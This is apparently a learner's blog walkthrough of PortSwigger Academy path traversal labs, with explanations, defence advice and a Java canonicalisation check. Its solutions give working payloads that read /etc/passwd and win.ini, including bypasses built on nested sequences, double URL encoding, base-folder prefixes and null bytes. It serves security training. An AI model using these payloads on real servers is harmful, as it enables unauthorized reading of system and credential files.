w-full" data-pagefind-body data-pagefind-meta=title data-pagefind-weight=10>PortSwigger Academy - Path traversal.</div></div><div class=onload-animation><div class="flex-wrap flex dark:text-neutral-400 gap-4 gap-x-4 gap-y-2 items-center mb-5 text-neutral-500"><div class="flex items-center"><div class=meta-icon><svg data-icon=material-symbols:calendar-today-outline-rounded height=1em width=1em class=text-xl><symbol id=ai:material-symbols:calendar-today-outline-rounded viewBox="0 0 24 24"><path d="M5 22q-.825 0-1.412-.587T3 20V6q0-.825.588-1.412T5 4h1V3q0-.425.288-.712T7 2t.713.288T8 3v1h8V3q0-.425.288-.712T17 2t.713.288T18 3v1h1q.825 0 1.413.588T21 6v14q0 .825-.587 1.413T19 22zm0-2h14V10H5zM5 8h14V6H5zm0 0V6z" fill=currentColor /></symbol><use href=#ai:material-symbols:calendar-today-outline-rounded></use></svg></div><span class="text-sm text-50 font-medium">09/07/2025</span></div><!-- <div class="flex items-center">
        <div class="meta-icon"
        >
            <Icon name="material-symbols:book-2-outline-rounded" class="text-xl"></Icon>
        </div>
        <div class="flex flex-row flex-nowrap items-center">
            <a href={url(`/archive/category/${category || 'uncategorized'}/`)} aria-label=`View all posts in the ${category} category`
               class="link-lg transition text-50 text-sm font-medium
                            hover:text-[var(--primary)] dark:hover:text-[var(--primary)] whitespace-nowrap">
                {category || i18n(I18nKey.uncategorized)}
            </a>
        </div>
    </div> --><div class="items-center flex"><div class=meta-icon><svg data-icon=material-symbols:tag-rounded height=1em width=1em class=text-xl><symbol id=ai:material-symbols:tag-rounded viewBox="0 0 24 24"><path d="m9 16l-.825 3.275q-.075.325-.325.525t-.6.2q-.475 0-.775-.375T6.3 18.8L7 16H4.275q-.5 0-.8-.387T3.3 14.75q.075-.35.35-.55t.625-.2H7.5l1-4H5.775q-.5 0-.8-.387T4.8 8.75q.075-.35.35-.55t.625-.2H9l.825-3.275Q9.9 4.4 10.15 4.2t.6-.2q.475 0 .775.375t.175.825L11 8h4l.825-3.275q.075-.325.325-.525t.6-.2q.475 0 .775.375t.175.825L17 8h2.725q.5 0 .8.387t.175.863q-.075.35-.35.55t-.625.2H16.5l-1 4h2.725q.5 0 .8.388t.175.862q-.075.35-.35.55t-.625.2H15l-.825 3.275q-.075.325-.325.525t-.6.2q-.475 0-.775-.375T12.3 18.8L13 16zm.5-2h4l1-4h-4z" fill=currentColor /></symbol><use href=#ai:material-symbols:tag-rounded></use></svg></div><div class="flex-row flex items-center flex-nowrap"><div class="text-sm mx-1.5 text-[var(--meta-divider)] hidden">/</div><a href=/archive/tag/Cybersecurity/ class="transition text-50 text-sm dark:hover:text-[var(--primary)] font-medium hover:text-[var(--primary)] link-lg whitespace-nowrap" aria-label="View all posts with the Cybersecurity tag">Cybersecurity</a><div class="text-sm mx-1.5 text-[var(--meta-divider)]">/</div><a href=/archive/tag/BURP/ class="transition text-50 text-sm dark:hover:text-[var(--primary)] font-medium hover:text-[var(--primary)] link-lg whitespace-nowrap" aria-label="View all posts with the BURP tag">BURP</a><div class="text-sm mx-1.5 text-[var(--meta-divider)]">/</div><a href=/archive/tag/portswigger/ class="transition text-50 text-sm dark:hover:text-[var(--primary)] font-medium hover:text-[var(--primary)] link-lg whitespace-nowrap" aria-label="View all posts with the portswigger tag">portswigger</a><div class="text-sm mx-1.5 text-[var(--meta-divider)]">/</div><a href=/archive/tag/Walkthrough/ class="transition text-50 text-sm dark:hover:text-[var(--primary)] font-medium hover:text-[var(--primary)] link-lg whitespace-nowrap" aria-label="View all posts with the Walkthrough tag">Walkthrough</a></div></div></div><div class="mb-5 border-[var(--line-divider)] border-b-[1px] border-dashed"></div></div><div class="onload-animation !max-w-none custom-md dark:prose-invert markdown-content mb-6 prose prose-base" data-pagefind-body><blockquote><p><a href=https://portswigger.net/web-security/learning-paths/path-traversal>https://portswigger.net/web-security/learning-paths/path-traversal</a></p></blockquote><p>This learning path covers path traversal vulnerabilities. You’ll learn how to carry out path traversal attacks and circumvent common obstacles. You’ll also learn how to prevent path traversal attacks.</p><hr><section><h3 id=what-is-path-traversal>What is path traversal?<a href=#what-is-path-traversal class=anchor><span class=anchor-icon data-pagefind-ignore="">#</span></a></h3><p>Path traversal is also known as directory traversal. These vulnerabilities enable an attacker to read arbitrary files on the server that is running an application. This might include:</p><ul><li>Application code and data.</li><li>Credentials for back-end systems.</li><li>Sensitive operating system files.</li></ul><p>In some cases, an attacker might be able to write to arbitrary files on the server, allowing them to modify application data or behavior, and ultimately take full control of the server.</p></section><section><h3 id=reading-arbitrary-files-via-path-traversal>Reading arbitrary files via path traversal<a href=#reading-arbitrary-files-via-path-traversal class=anchor><span class=anchor-icon data-pagefind-ignore="">#</span></a></h3><p>Imagine a shopping application that displays images of items for sale. This might load an image using the following HTML:</p><p><code>&#x3C;img src="/loadImage?filename=218.png"></code></p><p>The <code>loadImage</code> URL takes a <code>filename</code> parameter and returns the contents of the specified file. The image files are stored on disk in the location <code>/var/www/images/</code>. To return an image, the application appends the requested filename to this base directory and uses a filesystem API to read the contents of the file. In other words, the application reads from the following file path:</p><p><code>/var/www/images/218.png</code></p><p>This application implements no defenses against path traversal attacks. As a result, an attacker can request the following URL to retrieve the <code>/etc/passwd</code> file from the server’s filesystem:</p><p><code>https://insecure-website.com/loadImage?filename=../../../etc/passwd</code></p><p>This causes the application to read from the following file path:</p><p><code>/var/www/images/../../../etc/passwd</code></p><p>The sequence <code>../</code> is valid within a file path, and means to step up one level in the directory structure. The three consecutive <code>../</code> sequences step up from <code>/var/www/images/</code> to the filesystem root, and so the file that is actually read is:</p><p><code>/etc/passwd</code></p><p>On Unix-based operating systems, this is a standard file containing details of the users that are registered on the server, but an attacker could retrieve other arbitrary files using the same technique.</p><p>On Windows, both <code>../</code> and <code>..\</code> are valid directory traversal sequences. The following is an example of an equivalent attack against a Windows-based server:</p><p><code>https://insecure-website.com/loadImage?filename=..\..\..\windows\win.ini</code></p><section><h4 id=lab-file-path-traversal-simple-case>LAB: File path traversal, simple case<a href=#lab-file-path-traversal-simple-case class=anchor><span class=anchor-icon data-pagefind-ignore="">#</span></a></h4><p>This lab contains a path traversal vulnerability in the display of product images. To solve the lab, retrieve the contents of the /etc/passwd file.</p></section><section><h4 id=solution>Solution<a href=#solution class=anchor><span class=anchor-icon data-pagefind-ignore="">#</span></a></h4><p>To solve this, I started by right-clicking an image to grab its source URL. That gave me something like:</p><p><code>0aaf00eb033990da81ca5247006800a9.web-security-academy.net/image?filename=8.jpg</code></p><p>Then, I just kept adding ../ to the filename parameter a few times until I found the directory I was looking for.</p><p>The solution ended up being:</p><p><code>https://0aaf00eb033990da81ca5247006800a9.web-security-academy.net/image?filename=../../../etc/passwd</code></p></section></section><section><h3 id=common-obstacles-to-exploiting-path-traversal-vulnerabilities>Common obstacles to exploiting path traversal vulnerabilities<a href=#common-obstacles-to-exploiting-path-traversal-vulnerabilities class=anchor><span class=anchor-icon data-pagefind-ignore="">#</span></a></h3><p>Many applications that place user input into file paths implement defenses against path traversal attacks. These can often be bypassed.</p><p>If an application strips or blocks directory traversal sequences from the user-supplied filename, it might be possible to bypass the defense using a variety of techniques.</p><p>You might be able to use an absolute path from the filesystem root, such as <code>filename=/etc/passwd</code>, to directly reference a file without using any traversal sequences.</p><section><h4 id=lab-file-path-traversal-traversal-sequences-blocked-with-absolute-path-bypass>Lab: File path traversal, traversal sequences blocked with absolute path bypass<a href=#lab-file-path-traversal-traversal-sequences-blocked-with-absolute-path-bypass class=anchor><span class=anchor-icon data-pagefind-ignore="">#</span></a></h4><p>This lab contains a path traversal vulnerability in the display of product images.</p><p>The application blocks traversal sequences but treats the supplied filename as being relative to a default working directory.</p><p>To solve the lab, retrieve the contents of the <code>/etc/passwd</code> file.</p></section><section><h4 id=solution-1>Solution<a href=#solution-1 class=anchor><span class=anchor-icon data-pagefind-ignore="">#</span></a></h4><p>We intercept the request</p><pre class="astro-code github-dark" data-language=bash style=background-color:#24292e;color:#e1e4e8;overflow-x:auto tabindex=0><code><span class=line><span style=color:#b392f0>GET</span><span style=color:#9ecbff> /image?filename=5.jpg</span><span style=color:#9ecbff> HTTP/2</span></span>
<span class=line><span style=color:#b392f0>Host:</span><span style=color:#9ecbff> 0aa500d104625ca68276601f00de0098.web-security-academy.net</span></span>
<span class=line><span style=color:#b392f0>Cookie:</span><span style=color:#9ecbff> session=GvEnpHbu8HvC87C9631Fuv2PbCXDjwyX</span></span>
<span class=line><span style=color:#b392f0>Sec-Ch-Ua-Platform:</span><span style=color:#9ecbff> "Windows"</span></span>
<span class=line><span style=color:#b392f0>Accept-Language:</span><span style=color:#9ecbff> en-GB,en</span><span style=color:#e1e4e8>;q</span><span style=color:#f97583>=</span><span style=color:#9ecbff>0.9</span></span>
<span class=line><span style=color:#b392f0>Sec-Ch-Ua:</span><span style=color:#9ecbff> "Not)A;Brand"</span><span style=color:#e1e4e8>;v</span><span style=color:#f97583>=</span><span style=color:#9ecbff>"8",</span><span style=color:#9ecbff> "Chromium"</span><span style=color:#e1e4e8>;v</span><span style=color:#f97583>=</span><span style=color:#9ecbff>"138"</span></span>
<span class=line><span style=color:#b392f0>User-Agent:</span><span style=color:#9ecbff> Mozilla/5.0</span><span style=color:#e1e4e8> (Windows </span><span style=color:#9ecbff>NT</span><span style=color:#79b8ff> 10.0</span><span style=color:#e1e4e8>; </span><span style=color:#b392f0>Win64</span><span style=color:#e1e4e8>; </span><span style=color:#b392f0>x64</span><span style=color:#e1e4e8>) AppleWebKit/537.36 (</span><span style=color:#b392f0>KHTML,</span><span style=color:#9ecbff> like</span><span style=color:#9ecbff> Gecko</span><span style=color:#e1e4e8>) Chrome/138.0.0.0 Safari/537.36</span></span>
<span class=line><span style=color:#b392f0>Sec-Ch-Ua-Mobile:</span><span style=color:#9ecbff> ?0</span></span>
<span class=line><span style=color:#b392f0>Accept:</span><span style=color:#9ecbff> image/avif,image/webp,image/apng,image/svg+xml,image/</span><span style=color:#79b8ff>*</span><span style=color:#9ecbff>,</span><span style=color:#79b8ff>*</span><span style=color:#9ecbff>/</span><span style=color:#79b8ff>*</span><span style=color:#e1e4e8>;q</span><span style=color:#f97583>=</span><span style=color:#9ecbff>0.8</span></span>
<span class=line><span style=color:#b392f0>Sec-Fetch-Site:</span><span style=color:#9ecbff> same-origin</span></span>
<span class=line><span style=color:#b392f0>Sec-Fetch-Mode:</span><span style=color:#9ecbff> no-cors</span></span>
<span class=line><span style=color:#b392f0>Sec-Fetch-Dest:</span><span style=color:#9ecbff> image</span></span>
<span class=line><span style=color:#b392f0>Referer:</span><span style=color:#9ecbff> https://0aa500d104625ca68276601f00de0098.web-security-academy.net/</span></span>
<span class=line><span style=color:#b392f0>Accept-Encoding:</span><span style=color:#9ecbff> gzip,</span><span style=color:#9ecbff> deflate,</span><span style=color:#9ecbff> br</span></span>
<span class=line><span style=color:#b392f0>Priority:</span><span style=color:#9ecbff> i`</span></span></code></pre><p>and change<br><code>GET /image?filename=5.jpg</code><br>for<br><code>GET /image?filename=/etc/passwd</code></p></section></section><section><h3 id=common-obstacles-to-exploiting-path-traversal-vulnerabilities---continued>Common obstacles to exploiting path traversal vulnerabilities - Continued<a href=#common-obstacles-to-exploiting-path-traversal-vulnerabilities---continued class=anchor><span class=anchor-icon data-pagefind-ignore="">#</span></a></h3><p>You might be able to use nested traversal sequences, such as <code>....//</code> or <code>....\/</code>. These revert to simple traversal sequences when the inner sequence is stripped.</p><section><h4 id=lab-file-path-traversal-traversal-sequences-stripped-non-recursively>Lab: File path traversal, traversal sequences stripped non-recursively<a href=#lab-file-path-traversal-traversal-sequences-stripped-non-recursively class=anchor><span class=anchor-icon data-pagefind-ignore="">#</span></a></h4><p>This lab contains a path traversal vulnerability in the display of product images.</p><p>The application strips path traversal sequences from the user-supplied filename before using it.</p><p>To solve the lab, retrieve the contents of the <code>/etc/passwd</code> file.</p></section><section><h4 id=solution-2>Solution<a href=#solution-2 class=anchor><span class=anchor-icon data-pagefind-ignore="">#</span></a></h4><p>Since the lab strips path traversal sequences, using:</p><pre class="astro-code github-dark" data-language=bash style=background-color:#24292e;color:#e1e4e8;overflow-x:auto tabindex=0><code><span class=line><span style=color:#b392f0>GET</span><span style=color:#9ecbff> /image?filename=../../../etc/passwd</span><span style=color:#9ecbff> HTTP/2</span></span>
<span class=line><span style=color:#b392f0>Host:</span><span style=color:#9ecbff> 0a78008203c6729a829a255500bd0024.web-security-academy.net</span></span>
<span class=line><span style=color:#b392f0>Cookie:</span><span style=color:#9ecbff> session=RoX9uyjy6phuxm1jfFK3AksmsDJ5GQAg</span></span>
<span class=line><span style=color:#b392f0>Sec-Ch-Ua-Platform:</span><span style=color:#9ecbff> "Windows"</span></span>
<span class=line><span style=color:#b392f0>Accept-Language:</span><span style=color:#9ecbff> en-GB,en</span><span style=color:#e1e4e8>;q</span><span style=color:#f97583>=</span><span style=color:#9ecbff>0.9</span></span>
<span class=line><span style=color:#b392f0>Sec-Ch-Ua:</span><span style=color:#9ecbff> "Not)A;Brand"</span><span style=color:#e1e4e8>;v</span><span style=color:#f97583>=</span><span style=color:#9ecbff>"8",</span><span style=color:#9ecbff> "Chromium"</span><span style=color:#e1e4e8>;v</span><span style=color:#f97583>=</span><span style=color:#9ecbff>"138"</span></span>
<span class=line><span style=color:#b392f0>User-Agent:</span><span style=color:#9ecbff> Mozilla/5.0</span><span style=color:#e1e4e8> (Windows </span><span style=color:#9ecbff>NT</span><span style=color:#79b8ff> 10.0</span><span style=color:#e1e4e8>; </span><span style=color:#b392f0>Win64</span><span style=color:#e1e4e8>; </span><span style=color:#b392f0>x64</span><span style=color:#e1e4e8>) AppleWebKit/537.36 (</span><span style=color:#b392f0>KHTML,</span><span style=color:#9ecbff> like</span><span style=color:#9ecbff> Gecko</span><span style=color:#e1e4e8>) Chrome/138.0.0.0 Safari/537.36</span></span>
<span class=line><span style=color:#b392f0>Sec-Ch-Ua-Mobile:</span><span style=color:#9ecbff> ?0</span></span>
<span class=line><span style=color:#b392f0>Accept:</span><span style=color:#9ecbff> image/avif,image/webp,image/apng,image/svg+xml,image/</span><span style=color:#79b8ff>*</span><span style=color:#9ecbff>,</span><span style=color:#79b8ff>*</span><span style=color:#9ecbff>/</span><span style=color:#79b8ff>*</span><span style=color:#e1e4e8>;q</span><span style=color:#f97583>=</span><span style=color:#9ecbff>0.8</span></span>
<span class=line><span style=color:#b392f0>Sec-Fetch-Site:</span><span style=color:#9ecbff> same-origin</span></span>
<span class=line><span style=color:#b392f0>Sec-Fetch-Mode:</span><span style=color:#9ecbff> no-cors</span></span>
<span class=line><span style=color:#b392f0>Sec-Fetch-Dest:</span><span style=color:#9ecbff> image</span></span>
<span class=line><span style=color:#b392f0>Referer:</span><span style=color:#9ecbff> https://0a78008203c6729a829a255500bd0024.web-security-academy.net/</span></span>
<span class=line><span style=color:#b392f0>Accept-Encoding:</span><span style=color:#9ecbff> gzip,</span><span style=color:#9ecbff> deflate,</span><span style=color:#9ecbff> br</span></span>
<span class=line><span style=color:#b392f0>Priority:</span><span style=color:#9ecbff> u=2,</span><span style=color:#9ecbff> i`</span></span></code></pre><p>gets us:</p><pre class="astro-code github-dark" data-language=bash style=background-color:#24292e;color:#e1e4e8;overflow-x:auto tabindex=0><code><span class=line><span style=color:#b392f0>HTTP/2</span><span style=color:#79b8ff> 400</span><span style=color:#9ecbff> Bad</span><span style=color:#9ecbff> Request</span></span>
<span class=line><span style=color:#b392f0>Content-Type:</span><span style=color:#9ecbff> application/json</span><span style=color:#e1e4e8>; charset</span><span style=color:#f97583>=</span><span style=color:#9ecbff>utf-8</span></span>
<span class=line><span style=color:#b392f0>X-Frame-Options:</span><span style=color:#9ecbff> SAMEORIGIN</span></span>
<span class=line><span style=color:#b392f0>Content-Length:</span><span style=color:#79b8ff> 14</span></span>
<span class=line><span style=color:#b392f0>"No such file"</span><span style=color:#9ecbff>`</span></span></code></pre><p>What we can do is replace<br><code>GET /image?filename=../../../etc/passwd HTTP/2</code><br>for<br><code>GET /image?filename=....//....//....//etc/passwd HTTP/2</code></p></section></section><section><h3 id=common-obstacles-to-exploiting-path-traversal-vulnerabilities---continued-1>Common obstacles to exploiting path traversal vulnerabilities - Continued<a href=#common-obstacles-to-exploiting-path-traversal-vulnerabilities---continued-1 class=anchor><span class=anchor-icon data-pagefind-ignore="">#</span></a></h3><p>In some contexts, such as in a URL path or the <code>filename</code> parameter of a <code>multipart/form-data</code> request, web servers may strip any directory traversal sequences before passing your input to the application. You can sometimes bypass this kind of sanitization by URL encoding, or even double URL encoding, the <code>../</code> characters. This results in <code>%2e%2e%2f</code> and <code>%252e%252e%252f</code> respectively. Various non-standard encodings, such as <code>..%c0%af</code> or <code>..%ef%bc%8f</code>, may also work.</p><section><h4 id=lab-file-path-traversal-traversal-sequences-stripped-with-superfluous-url-decode>Lab: File path traversal, traversal sequences stripped with superfluous URL-decode<a href=#lab-file-path-traversal-traversal-sequences-stripped-with-superfluous-url-decode class=anchor><span class=anchor-icon data-pagefind-ignore="">#</span></a></h4><p>This lab contains a path traversal vulnerability in the display of product images.</p><p>The application blocks input containing path traversal sequences. It then performs a URL-decode of the input before using it.</p><p>To solve the lab, retrieve the contents of the <code>/etc/passwd</code> file.</p></section><section><h4 id=solution-3>Solution<a href=#solution-3 class=anchor><span class=anchor-icon data-pagefind-ignore="">#</span></a></h4><p>At first I tried:</p><p><code>GET /image?filename=../../../etc/passwd HTTP/2</code><br>and<br><code>GET /image?filename=....//....//....//etc/passwd HTTP/2</code></p><p>But we got</p><pre class="astro-code github-dark" data-language=bash style=background-color:#24292e;color:#e1e4e8;overflow-x:auto tabindex=0><code><span class=line><span style=color:#b392f0>HTTP/2</span><span style=color:#79b8ff> 400</span><span style=color:#9ecbff> Bad</span><span style=color:#9ecbff> Request</span></span>
<span class=line><span style=color:#b392f0>Content-Type:</span><span style=color:#9ecbff> application/json</span><span style=color:#e1e4e8>; charset</span><span style=color:#f97583>=</span><span style=color:#9ecbff>utf-8</span></span>
<span class=line><span style=color:#b392f0>X-Frame-Options:</span><span style=color:#9ecbff> SAMEORIGIN</span></span>
<span class=line><span style=color:#b392f0>Content-Length:</span><span style=color:#79b8ff> 14</span></span>
<span class=line><span style=color:#b392f0>"No such file"</span><span style=color:#9ecbff>`</span></span></code></pre><p>Instead we double encode the ../ part:<br><code>../</code> —> <code>%2e%2e%2f</code> —> <code>%252e%252e%252f</code></p><p><code>GET /image?filename=%252e%252e%252f%252e%252e%252f%252e%252e%252fetc/passwd HTTP/2</code></p></section></section><section><h3 id=common-obstacles-to-exploiting-path-traversal-vulnerabilities---continued-2>Common obstacles to exploiting path traversal vulnerabilities - Continued<a href=#common-obstacles-to-exploiting-path-traversal-vulnerabilities---continued-2 class=anchor><span class=anchor-icon data-pagefind-ignore="">#</span></a></h3><p>An application may require the user-supplied filename to start with the expected base folder, such as <code>/var/www/images</code>. In this case, it might be possible to include the required base folder followed by suitable traversal sequences. For example: <code>filename=/var/www/images/../../../etc/passwd</code>.</p><section><h4 id=lab-file-path-traversal-validation-of-start-of-path>Lab: File path traversal, validation of start of path<a href=#lab-file-path-traversal-validation-of-start-of-path class=anchor><span class=anchor-icon data-pagefind-ignore="">#</span></a></h4><p>This lab contains a path traversal vulnerability in the display of product images.</p><p>The application transmits the full file path via a request parameter, and validates that the supplied path starts with the expected folder.</p><p>To solve the lab, retrieve the contents of the <code>/etc/passwd</code> file.</p></section><section><h4 id=solution-4>Solution<a href=#solution-4 class=anchor><span class=anchor-icon data-pagefind-ignore="">#</span></a></h4><p>We replace</p><p><code>GET /image?filename=/var/www/images/47.jpg HTTP/2</code><br>for<br><code>GET /image?filename=/var/www/images/../../../etc/passwd</code></p></section></section><section><h3 id=common-obstacles-to-exploiting-path-traversal-vulnerabilities---continued-3>Common obstacles to exploiting path traversal vulnerabilities - Continued<a href=#common-obstacles-to-exploiting-path-traversal-vulnerabilities---continued-3 class=anchor><span class=anchor-icon data-pagefind-ignore="">#</span></a></h3><p>An application may require the user-supplied filename to end with an expected file extension, such as <code>.png</code>. In this case, it might be possible to use a null byte to effectively terminate the file path before the required extension. For example: <code>filename=../../../etc/passwd%00.png</code>.</p></section><section><h3 id=lab-file-path-traversal-validation-of-file-extension-with-null-byte-bypass>Lab: File path traversal, validation of file extension with null byte bypass<a href=#lab-file-path-traversal-validation-of-file-extension-with-null-byte-bypass class=anchor><span class=anchor-icon data-pagefind-ignore="">#</span></a></h3><p>This lab contains a path traversal vulnerability in the display of product images.</p><p>The application validates that the supplied filename ends with the expected file extension.</p><p>To solve the lab, retrieve the contents of the <code>/etc/passwd</code> file.</p><section><h4 id=solution-5>Solution<a href=#solution-5 class=anchor><span class=anchor-icon data-pagefind-ignore="">#</span></a></h4><p>We use the null byte trick: <code>filename=../../../etc/passwd%00.png</code>.</p></section></section><section><h3 id=how-to-prevent-a-path-traversal-attack>How to prevent a path traversal attack<a href=#how-to-prevent-a-path-traversal-attack class=anchor><span class=anchor-icon data-pagefind-ignore="">#</span></a></h3><p>The most effective way to prevent path traversal vulnerabilities is to avoid passing user-supplied input to filesystem APIs altogether. Many application functions that do this can be rewritten to deliver the same behavior in a safer way.</p><p>If you can’t avoid passing user-supplied input to filesystem APIs, we recommend using two layers of defense to prevent attacks:</p><ul><li>Validate the user input before processing it. Ideally, compare the user input with a whitelist of permitted values. If that isn’t possible, verify that the input contains only permitted content, such as alphanumeric characters only.</li><li>After validating the supplied input, append the input to the base directory and use a platform filesystem API to canonicalize the path. Verify that the canonicalized path starts with the expected base directory.</li></ul><p>Below is an example of some simple Java code to validate the canonical path of a file based on user input:</p><p><code>File file = new File(BASE_DIRECTORY, userInput); if (file.getCanonicalPath().startsWith(BASE_DIRECTORY)) { // process file }</code></p></section></div><script type=module>const s=new MutationObserver(l);function l(){s.disconnect();let e=Array.from(document.querySelectorAll("pre"));for(let t of e){if("DIV"===t.parentElement?.nodeName&&t.parentElement?.classList.contains("code-block"))continue;let e=document.createElement("div");e.className="relative code-block";let s=document.createElement("button");s.className="copy-btn btn-regular-dark absolute active:scale-90 h-8 w-8 top-2 right-2 opacity-75 text-sm p-1.5 rounded-lg transition-all ease-in-out",t.setAttribute("tabindex","0"),t.parentNode&&t.parentNode.insertBefore(e,t);let o,n='<svg class="copy-btn-icon copy-icon" xmlns="http://www.w3.org/2000/svg" height="20px" viewBox="0 -960 960 960" width="20px"><path d="M368.37-237.37q-34.48 0-58.74-24.26-24.26-24.26-24.26-58.74v-474.26q0-34.48 24.26-58.74 24.26-24.26 58.74-24.26h378.26q34.48 0 58.74 24.26 24.26 24.26 24.26 58.74v474.26q0 34.48-24.26 58.74-24.26 24.26-58.74 24.26H368.37Zm0-83h378.26v-474.26H368.37v474.26Zm-155 238q-34.48 0-58.74-24.26-24.26-24.26-24.26-58.74v-515.76q0-17.45 11.96-29.48 11.97-12.02 29.33-12.02t29.54 12.02q12.17 12.03 12.17 29.48v515.76h419.76q17.45 0 29.48 11.96 12.02 11.97 12.02 29.33t-12.02 29.54q-12.03 12.17-29.48 12.17H213.37Zm155-238v-474.26 474.26Z"/></svg>',c='<svg class="copy-btn-icon success-icon" xmlns="http://www.w3.org/2000/svg" height="20px" viewBox="0 -960 960 960" width="20px"><path d="m389-377.13 294.7-294.7q12.58-12.67 29.52-12.67 16.93 0 29.61 12.67 12.67 12.68 12.67 29.53 0 16.86-12.28 29.14L419.07-288.41q-12.59 12.67-29.52 12.67-16.94 0-29.62-12.67L217.41-430.93q-12.67-12.68-12.79-29.45-.12-16.77 12.55-29.45 12.68-12.67 29.62-12.67 16.93 0 29.28 12.67L389-377.13Z"/></svg>';s.innerHTML=`<div>${n} ${c}</div>\n      `,e.appendChild(t),e.appendChild(s),s.addEventListener("click",(async()=>{o&&clearTimeout(o);let e=t?.querySelector("code")?.innerText;void 0!==e&&(await navigator.clipboard.writeText(e),s.classList.add("success"),o=setTimeout((()=>{s.classList.remove("success")}),1e3))}))}s.observe(document.body,{childList:!0,subtree:!0})}s.observe(document.body,{childList:!0,subtree:!0})</script></div></div><div class="w-full flex gap-4 flex-col mb-4 justify-between md:flex-row overflow-hidden"><a href=/posts/portswiggeracademymoreaccesscontrollabs/ class="w-full font-bold active:scale-95 overflow-hidden"><div class="w-full flex gap-4 items-center btn-card h-[3.75rem] max-w-full px-4 rounded-2xl !justify-start"><svg data-icon=material-symbols:chevron-left-rounded height=1em width=1em class="text-[var(--primary)] text-[2rem]"><symbol id=ai:material-symbols:chevron-left-rounded viewBox="0 0 24 24"><path d="m10.8 12l3.9 3.9q.275.275.275.7t-.275.7t-.7.275t-.7-.275l-4.6-4.6q-.15-.15-.212-.325T8.425 12t.063-.375t.212-.325l4.6-4.6q.275-.275.7-.275t.7.275t.275.7t-.275.7z" fill=currentColor /></symbol><use href=#ai:material-symbols:chevron-left-rounded></use></svg><div class="transition whitespace-nowrap dark:text-white/75 max-w-[calc(100%_-_3rem)] overflow-ellipsis overflow-hidden text-black/75">PortSwigger Academy - More Broken Access Control Labs.</div></div></a><a href=/posts/portswiggeracademyp2/ class="w-full font-bold active:scale-95 overflow-hidden"><div class="w-full flex gap-4 items-center btn-card h-[3.75rem] max-w-full px-4 rounded-2xl !justify-end"><div class="transition whitespace-nowrap dark:text-white/75 max-w-[calc(100%_-_3rem)] overflow-ellipsis overflow-hidden text-black/75">PortSwigger Academy - Server-side vulnerabilities (Part 2).</div><svg data-icon=material-symbols:chevron-right-rounded height=1em width=1em class="text-[var(--primary)] text-[2rem]" viewBox="0 0 24 24"><use href=#ai:material-symbols:chevron-right-rounded></use></svg></div></a></div><div class="onload-animation col-span-2 footer hidden lg:block"><br></div></div></main><div class="onload-animation col-span-2 footer block lg:hidden"><br></div></div><div class="hidden lg:block back-to-top-wrapper" data-astro-cid-eymb5ayk><div class="transition flex items-center back-to-top-btn hide overflow-hidden rounded-2xl" id=back-to-top-btn data-astro-cid-eymb5ayk onclick=backToTop()><button class="w-[3.75rem] btn-card h-[3.75rem]" aria-label="Back to Top" data-astro-cid-eymb5ayk><svg data-icon=material-symbols:keyboard-arrow-up-rounded height=1em width=1em class=mx-auto data-astro-cid-eymb5ayk=true><symbol id=ai:material-symbols:keyboard-arrow-up-rounded viewBox="0 0 24 24"><path d="m12 10.8l-3.9 3.9q-.275.275-.7.275t-.7-.275t-.275-.7t.275-.7l4.6-4.6q.3-.3.7-.3t.7.3l4.6 4.6q.275.275.275.7t-.275.7t-.7.275t-.7-.275z" fill=currentColor /></symbol><use href=#ai:material-symbols:keyboard-arrow-up-rounded></use></svg></button></div></div><script>function backToTop(){window.scroll({top:0,behavior:"smooth"})}</script></div></div><div class="w-full absolute 2xl:block hidden z-0"><div class="mx-auto relative max-w-[var(--page-width)]"><div class="transition flex items-center absolute -right-[var(--toc-width)] hidden lg:block top-0 w-[var(--toc-width)]" id=toc-wrapper><div class="h-[calc(100vh_-_20rem)] fixed hide-scrollbar overflow-x-hidden overflow-y-scroll top-14 w-[var(--toc-width)]" id=toc-inner-wrapper><div class="w-full h-full transition-swup-fade" id=toc><div class="w-full h-8"></div><table-of-contents class=group><a href=#what-is-path-traversal class="transition flex py-2 active:bg-[var(--toc-btn-active)] gap-2 hover:bg-[var(--toc-btn-hover)] min-h-9 px-2 relative rounded-xl w-full"><div class="transition flex items-center justify-center font-bold h-5 rounded-lg shrink-0 text-xs w-5 bg-[var(--toc-badge-bg)] text-[var(--btn-content)]">1</div><div class="transition text-50 text-sm">What is path traversal?</div></a><a href=#reading-arbitrary-files-via-path-traversal class="transition flex py-2 active:bg-[var(--toc-btn-active)] gap-2 hover:bg-[var(--toc-btn-hover)] min-h-9 px-2 relative rounded-xl w-full"><div class="transition flex items-center justify-center font-bold h-5 rounded-lg shrink-0 text-xs w-5 bg-[var(--toc-badge-bg)] text-[var(--btn-content)]">2</div><div class="transition text-50 text-sm">Reading arbitrary files via path traversal</div></a><a href=#lab-file-path-traversal-simple-case class="transition flex py-2 active:bg-[var(--toc-btn-active)] gap-2 hover:bg-[var(--toc-btn-hover)] min-h-9 px-2 relative rounded-xl w-full"><div class="transition flex items-center justify-center font-bold h-5 rounded-lg shrink-0 text-xs w-5 ml-4"><div class="transition bg-[var(--toc-badge-bg)] h-2 rounded-[0.1875rem] w-2"></div></div><div class="transition text-50 text-sm">LAB: File path traversal, simple case</div></a><a href=#solution class="transition flex py-2 active:bg-[var(--toc-btn-active)] gap-2 hover:bg-[var(--toc-btn-hover)] min-h-9 px-2 relative rounded-xl w-full"><div class="transition flex items-center justify-center font-bold h-5 rounded-lg shrink-0 text-xs w-5 ml-4"><div class="transition bg-[var(--toc-badge-bg)] h-2 rounded-[0.1875rem] w-2"></div></div><div class="transition text-50 text-sm">Solution</div></a><a href=#common-obstacles-to-exploiting-path-traversal-vulnerabilities class="transition flex py-2 active:bg-[var(--toc-btn-active)] gap-2 hover:bg-[var(--toc-btn-hover)] min-h-9 px-2 relative rounded-xl w-full"><div class="transition flex items-center justify-center font-bold h-5 rounded-lg shrink-0 text-xs w-5 bg-[var(--toc-badge-bg)] text-[var(--btn-content)]">3</div><div class="transition text-50 text-sm">Common obstacles to exploiting path traversal vulnerabilities</div></a><a href=#lab-file-path-traversal-traversal-sequences-blocked-with-absolute-path-bypass class="transition flex py-2 active:bg-[var(--toc-btn-active)] gap-2 hover:bg-[var(--toc-btn-hover)] min-h-9 px-2 relative rounded-xl w-full"><div class="transition flex items-center justify-center font-bold h-5 rounded-lg shrink-0 text-xs w-5 ml-4"><div class="transition bg-[var(--toc-badge-bg)] h-2 rounded-[0.1875rem] w-2"></div></div><div class="transition text-50 text-sm">Lab: File path traversal, traversal sequences blocked with absolute path bypass</div></a><a href=#solution-1 class="transition flex py-2 active:bg-[var(--toc-btn-active)] gap-2 